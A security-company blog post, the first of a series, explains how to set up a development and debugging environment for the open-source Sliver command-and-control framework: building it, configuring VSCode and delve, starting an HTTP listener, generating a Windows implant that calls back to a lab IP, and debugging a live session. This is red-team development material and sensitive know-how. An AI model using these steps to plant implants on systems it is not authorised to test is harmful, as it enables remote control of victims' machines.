# https://hnsecurity.it/blog/customizing-sliver-part-1/

[Skip to main content](https://hnsecurity.it/blog/customizing-sliver-part-1/#sections-container)

![Silver Framework logo](https://hnsecurity.it/wp-content/uploads/2025/09/SILVER-uai-836x836.jpg)

# Customizing Sliver – Part 1

October 24, 2023\|[![Alessandro Iandoli](https://secure.gravatar.com/avatar/644822f5d8329ca419a50c1f39c97de5ccd163d1932e4cdc60a6cc8cb64ed29e?s=40&d=mm&r=g)](https://hnsecurity.it/blog/author/ale98/) By [Alessandro Iandoli](https://hnsecurity.it/blog/author/ale98/)

[Tools](https://hnsecurity.it/blog/category/tools/ "View all posts in Tools"), [Articles](https://hnsecurity.it/blog/category/articles/ "View all posts in Articles")

Lately I’ve been conducting research into **open-source C2 frameworks** and I found [Sliver](https://github.com/BishopFox/sliver) really interesting. Therefore, I’ve started understanding the inner workings of the framework and develop on it, by applying some fixes and adding capabilities such as the **reverse port forwarding** feature.

Twitter Embed

> Sliver v1.5.27
>
> \\* Reverse port forwarding support!
>
> \\* Improved support for MSF integrations (byos)
>
> \\* Remote machine locale
>
> \\* Improved handling of TOTP
>
> \\* Dependency updates, and other random improvements
>
> Big thanks to James Golovich and MrAle98 for the PRs! [https://t.co/MwhMKg0ewy](https://t.co/MwhMKg0ewy)
>
> — Moloch (@LittleJoeTables) [September 21, 2022](https://twitter.com/LittleJoeTables/status/1572417917689667584?ref_src=twsrc%5Etfw)

In this [series](https://hnsecurity.it/tag/sliver/) of blog posts I aim to provide all the information required in order to **contribute to the Sliver C2 project**. The series is split in 3 parts:

- **Setting up the development environment** ( [Part 1](https://hnsecurity.it/blog/customizing-sliver-part-1/))
- **Communication model overview** ( [Part 2](https://hnsecurity.it/blog/customizing-sliver-part-2/))
- **Creating our first command** ( [Part 3](https://hnsecurity.it/blog/customizing-sliver-part-3/))

At the end of the series, you should be able to add your own commands to the framework.

_Disclaimer: I’m not an experienced developer. Therefore, I’ll just show what I typically do in order to develop and test the project, which might be not the best possible way to do so._

## Setting up the development environment

In this tutorial, we are going to create a command that gets executed by a Windows implant, with the help of the [documentation](https://github.com/BishopFox/sliver/wiki/Debugging-Sliver).

To follow the tutorial you are going to need:

- A Linux machine (I’m going to use Kali but Ubuntu is also fine) as the attacker
- A Windows machine as the victim

In the **L** **inux machine** you will need to install support for the Go language:

```
sudo apt update
sudo apt install golang-go
```

You will also need [Visual Studio Code](https://code.visualstudio.com/), along with its **Go extension**. When VSCode prompts you about **installing all the other Go utilities** (like IntelliSense for Go, delve for debugging Go, etc.) **just click yes and install everything**.

![](https://cdn-images-1.medium.com/max/1000/1*IMxkYCNPPtI8pFs25BKEpA.png)Go extension for VSCode

You will also need to install **protoc** to modify .proto files. In order to do that, I suggest you to follow the guide already present in the Sliver C2 wiki [here](https://github.com/BishopFox/sliver/wiki/Compile-From-Source#developers).

In the **W** **indows machine** you will need to install **G** **o** and then **delve** through the following command **:**

```
go.exe install github.com/go-delve/delve/cmd/dlv@latest
```

In your **L** **inux machine** run the following commands:

```
git clone https://github.com/BishopFox/sliver.git
cd sliver
make
```

If everything compiled successfully, open the sliver folder in vscode, and create the file **.vscode/launch.json** with the following content:

```
{
    "version": "0.2.0",
    "configurations": [\
        {\
            "name": "Launch client",\
            "type": "go",\
            "request": "launch",\
            "mode": "debug",\
            "program": "${workspaceFolder}/client/main.go",\
            "buildFlags": "-tags osusergo,netgo,cgosqlite,sqlite_omit_load_extension,client -ldflags='-X github.com/bishopfox/sliver/client/version.Version=1.5.22 -X github.com/bishopfox/sliver/client/version.CompiledAt=Never -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=aabbcc -X github.com/bishopfox/sliver/client/version.GitDirty=Dirty'",\
            "console": "integratedTerminal",\
            "xdebugSettings": { "max_data": -1 }\
        },\
        {\
            "name": "Launch server",\
            "type": "go",\
            "request": "launch",\
            "mode": "debug",\
            "program": "${workspaceFolder}/server/main.go",\
            "buildFlags": "-tags osusergo,netgo,go_sqlite,server -ldflags='-X github.com/bishopfox/sliver/client/version.Version=1.1.2 -X github.com/bishopfox/sliver/client/version.CompiledAt=Never -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=aabbcc -X github.com/bishopfox/sliver/client/version.GitDirty=Dirty'",\
            "console": "integratedTerminal",\
            "xdebugSettings": { "max_data": -1 }\
        }\
    ]
}
```

Then create the file **.vscode/settings.json** with the following content:

```
{
    "go.toolsEnvVars": {
        "GOOS": "linux"
    },
    "go.delveConfig": {
        "dlvLoadConfig": {
            "maxStringLen": 5000,
            "maxArrayValues": 1000,
        },
    }
}
```

At the end your directory structure should look something like this:

![](https://cdn-images-1.medium.com/max/1000/1*ypeFGEF4PevbiLMFkcjF5A.png)Folder structure in VSCode

Now in the sliver folder run the following command:

```
./go-assets.sh
```

And inside VSCode run the server in debug mode by clicking **Run and Debug>Launch server**:

![](https://cdn-images-1.medium.com/max/1000/1*FSB2GEkHpt4__TPEdYwwEQ.png)Launch Sliver server in debug mode

A terminal should appear in VSCode with the Sliver server started successfully:

![](https://cdn-images-1.medium.com/max/1000/1*KrZimxbJ9PyXqDZlNnoiIQ.png)Sliver server running

Now in the Sliver console terminal create a new operator and start multiplayer mode:

```
sliver > new-operator -n ale -l 127.0.0.1

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/kali/sliver/server/ale_127.0.0.1.cfg

sliver > multiplayer

[*] Multiplayer mode enabled!

sliver >
```

Then import the client configuration file in the Sliver client:

```
┌──(kali㉿kali)-[~/sliver]
└─$ ~/sliver/sliver-client import /home/kali/sliver/server/ale_127.0.0.1.cfg
2023/08/27 16:23:13 Saved new client config to: /home/kali/.sliver-client/configs/ale_127.0.0.1.cfg

┌──(kali㉿kali)-[~/sliver]
└─$
```

Now you should be able to launch the client in debug mode in VSCode, by clicking **Run and Debug>Launch client**:

![](https://cdn-images-1.medium.com/max/1000/1*rfAwl9wIWuW0WGS-FuLo1Q.png)Launch Sliver client in debug mode

You should have two terminals running in VSCode; one for the Sliver client one for the server:

![](https://cdn-images-1.medium.com/max/1000/1*d5TLgv3fmEV21TFNNBNT-A.png)Two terminals running Sliver client and server

At this point, we are able to debug both the client and the server. Let’s now see how to debug the implant in Windows.

**Debugging the implant**

Let’s first start an HTTP listener and generate the implant:

```
sliver > http -D

[*] Starting HTTP :80 listener ...

[*] Successfully started job #1

sliver > jobs

 ID   Name        Protocol   Port
==== =========== ========== =======
 1    http        tcp        80
 2    grpc/mtls   tcp        31337

sliver > generate --http http://192.168.157.158 -d

[*] Generating new windows/amd64 implant binary
[*] Build completed in 18s
[*] Implant saved to /home/kali/sliver/client/SOLAR_CARRIAGE.exe

sliver >
```

Here the flags of the command “generate” are explained:

- -d: to specify debug mode. This will make the implant print more information to screen when running.
-  — http: to specify the implant to connect to the given URL.

The server is going to generate a folder containing the Go code of the implant at location **~/.sliver/slivers/windows/amd64/<implant\_name>/src** where **<implant \_name> in this case will be SOLAR\_CARRIAGE** as printed on screen by the console.

So browse to ~/.sliver/slivers/windows/amd64/<implant\_name>/ and open the folder in another VSCode window.

```

┌──(kali㉿kali)-[~/sliver]
└─$ cd ~/.sliver/slivers/windows/amd64/SOLAR_CARRIAGE/src

┌──(kali㉿kali)-[~/.sliver/slivers/windows/amd64/SOLAR_CARRIAGE/src]
└─$ code .
```

Now create the file .vscode/launch.json with the following content:

```
{
    "version": "0.2.0",
    "configurations": [\
        {\
            "name": "Debug Implant",\
            "type": "go",\
            "request": "attach",\
            "mode": "remote",\
            "remotePath": "",\
            "port": REMOTE_PORT, // replace this\
            "host": "REMOTE_HOST" // replace this\
        }\
    ]
}
```

Move your implant executable, in this case SOLAR\_CARRIAGE.exe, to your Windows machine and run the following command:

```
> dlv.exe exec --api-version 2 --headless --listen 192.168.157.131:5555 --log .\SOLAR_CARRIAGE.exe
API server listening at: 192.168.157.131:5555
2023-08-27T17:08:40+02:00 warning layer=rpc Listening for remote connections (connections are not authenticated nor encrypted)
2023-08-27T17:08:40+02:00 info layer=debugger launching process with args: [.\SOLAR_CARRIAGE.exe]
2023-08-27T17:08:41+02:00 debug layer=debugger Adding target 436 "path\\to\\SOLAR_CARRIAGE.exe"
```

In this case I’ll **start a debug server on my Windows machine listening on IP address 192.168.157.131 and port 5555**, therefore I’m going to **replace REMOTE\_HOST and REMOTE\_PORT with 192.168.157.131 and 5555** **inside the launch.json** file previously created.

My launch.json file will have the following content:

![](https://cdn-images-1.medium.com/max/1000/1*J4DKcFS_ZjAaTAn6FPPRTg.png)Final content of launch.json

Now add the GOOS=windows env variable to VSCode:

![](https://cdn-images-1.medium.com/max/1000/1*F1f2Njy9WAn-csYVBjKOog.png)Go environment variables

And select Run and Debug>Debug implant in order to start debugging the implant. You should receive a connection back on the C2 server if everything went fine.

Now try to place a breakpoint at function **dirListHandler()** inside **implant/sliver/handlers/handler.go** and in the Sliver console launch the command:

```
[*] Session b0603a12 SOLAR_CARRIAGE - 192.168.157.131:52698 (DESKTOP-URP43TK) - windows/amd64 - Sun, 27 Aug 2023 17:25:36 CEST

sliver > use b0603a12

[*] Active session SOLAR_CARRIAGE (b0603a12-743b-4050-b0ed-43399b5edb3b)

sliver (SOLAR_CARRIAGE) > ls
```

As you can see in VSCode the breakpoint got hit successfully:

![](https://cdn-images-1.medium.com/max/1000/1*FpZcanccdbZsWXM20cRSSA.png)Breakpoint was hit

You should now be able to debug any component of the framework. This capability will be useful for the next parts of this [series](https://hnsecurity.it/tag/sliver/) when defining our new command. Until next time!

[sliver](https://hnsecurity.it/blog/tag/sliver/) [golang](https://hnsecurity.it/blog/tag/golang/) [windows](https://hnsecurity.it/blog/tag/windows/) [c2](https://hnsecurity.it/blog/tag/c2/) [red teaming](https://hnsecurity.it/blog/tag/red-teaming/)

[![](https://hnsecurity.it/wp-content/uploads/2025/09/BURP.jpg)](https://hnsecurity.it/blog/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-9/?media_link=1)

[Tools](https://hnsecurity.it/blog/category/tools/)[Articles](https://hnsecurity.it/blog/category/articles/)

December 10, 2025

### [Extending Burp Suite for fun and profit – The Montoya way – Part 9](https://hnsecurity.it/blog/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-9/)

[![Groovy logo](https://hnsecurity.it/wp-content/uploads/2025/09/GROOVY.jpg)](https://hnsecurity.it/blog/groovy-template-engine-exploitation-part-2/?media_link=1)

[Exploits](https://hnsecurity.it/blog/category/exploits/)[Articles](https://hnsecurity.it/blog/category/articles/)

November 11, 2025

### [Groovy Template Engine Exploitation – Notes from a real case scenario, part 2](https://hnsecurity.it/blog/groovy-template-engine-exploitation-part-2/)

[![Brida logo](https://hnsecurity.it/wp-content/uploads/2025/10/BRIDA_2.png)](https://hnsecurity.it/blog/brida-0-6-released/?media_link=1)

[Tools](https://hnsecurity.it/blog/category/tools/)[Articles](https://hnsecurity.it/blog/category/articles/)

October 28, 2025

### [Brida 0.6 released!](https://hnsecurity.it/blog/brida-0-6-released/)

[![hex-rays logo](https://hnsecurity.it/wp-content/uploads/2025/10/HEX-RAYS_4.png)](https://hnsecurity.it/blog/streamlining-vulnerability-research-with-the-idalib-rust-bindings-for-ida-9-2/?media_link=1)

[Tools](https://hnsecurity.it/blog/category/tools/)[Articles](https://hnsecurity.it/blog/category/articles/)

October 14, 2025

### [Streamlining Vulnerability Research with the idalib Rust Bindings for IDA 9.2](https://hnsecurity.it/blog/streamlining-vulnerability-research-with-the-idalib-rust-bindings-for-ida-9-2/)

[![LLM Icon](https://hnsecurity.it/wp-content/uploads/2025/09/LLM.jpg)](https://hnsecurity.it/blog/attacking-genai-applications-and-llms-sometimes-all-it-takes-is-to-ask-nicely/?media_link=1)

[Articles](https://hnsecurity.it/blog/category/articles/)

July 29, 2025

### [Attacking GenAI applications and LLMs – Sometimes all it takes is to ask nicely!](https://hnsecurity.it/blog/attacking-genai-applications-and-llms-sometimes-all-it-takes-is-to-ask-nicely/)

[![](https://hnsecurity.it/wp-content/uploads/2025/09/CIRCUITI.jpg)](https://hnsecurity.it/blog/fault-injection-follow-the-white-rabbit/?media_link=1)

[Articles](https://hnsecurity.it/blog/category/articles/)

June 18, 2025

### [Fault Injection – Follow the White Rabbit](https://hnsecurity.it/blog/fault-injection-follow-the-white-rabbit/)

[![ZeroDay logo](https://hnsecurity.it/wp-content/uploads/2025/09/ZERODAY.jpg)](https://hnsecurity.it/blog/my-zero-day-quest-bluehat-podcast/?media_link=1)

[Events](https://hnsecurity.it/blog/category/events/)[Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/)[Articles](https://hnsecurity.it/blog/category/articles/)

May 6, 2025

### [My Zero Day Quest & BlueHat Podcast](https://hnsecurity.it/blog/my-zero-day-quest-bluehat-podcast/)

[![Rust logo](https://hnsecurity.it/wp-content/uploads/2025/09/RUST.jpg)](https://hnsecurity.it/blog/aiding-reverse-engineering-with-rust-and-a-local-llm/?media_link=1)

[Tools](https://hnsecurity.it/blog/category/tools/)[Articles](https://hnsecurity.it/blog/category/articles/)

April 15, 2025

### [Aiding reverse engineering with Rust and a local LLM](https://hnsecurity.it/blog/aiding-reverse-engineering-with-rust-and-a-local-llm/)

[![Rust logo](https://hnsecurity.it/wp-content/uploads/2025/09/RUST.jpg)](https://hnsecurity.it/blog/streamlining-vulnerability-research-with-ida-pro-and-rust/?media_link=1)

[Articles](https://hnsecurity.it/blog/category/articles/)[Tools](https://hnsecurity.it/blog/category/tools/)

February 25, 2025

### [Streamlining vulnerability research with IDA Pro and Rust](https://hnsecurity.it/blog/streamlining-vulnerability-research-with-ida-pro-and-rust/)

[Scroll to top](https://hnsecurity.it/blog/customizing-sliver-part-1/#)

We use cookies to improve your browsing experience and analyze our traffic. By clicking "Accept all", you consent to the use of cookies.Accept AllPrivacy policy

Twitter Widget Iframe